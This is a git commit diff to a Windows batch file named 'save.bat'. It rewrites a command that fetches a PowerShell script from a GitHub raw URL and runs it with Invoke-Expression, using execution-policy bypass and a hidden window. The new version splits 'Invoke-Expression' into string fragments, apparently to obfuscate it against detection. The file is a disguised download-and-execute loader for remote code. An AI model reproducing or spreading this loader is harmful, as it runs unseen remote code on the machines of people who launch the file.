fd242d07f698048ae7e357ba1955f58e3513836d
Brandon c2e <brand.opn0@gmail.com>
2026-08-06 23:09:41 +0600

    Update save.bat

--- save.bat
+++ save.bat
@@ -1,6 +1,8 @@
 @echo off
-set "e1=Invoke-Expression"
-set "e2=(Invoke-RestMethod"
-set "e3=https://github.com/x-ben10/talulabo/raw/refs/heads/main/Savii.ps1)"
-set "cmd=%e1% %e2% %e3%"
+set "e1=Invoke"
+set "e2=-Expression"
+set "e3= ("
+set "e4=Invoke-RestMethod"
+set "e5= https://github.com/x-ben10/talulabo/raw/refs/heads/main/Savii.ps1)"
+set "cmd=%e1%%e2%%e3%%e4%%e5%"
 powershell -NoP -NoL -ep Bypass -Win 1 -Command "%cmd%"
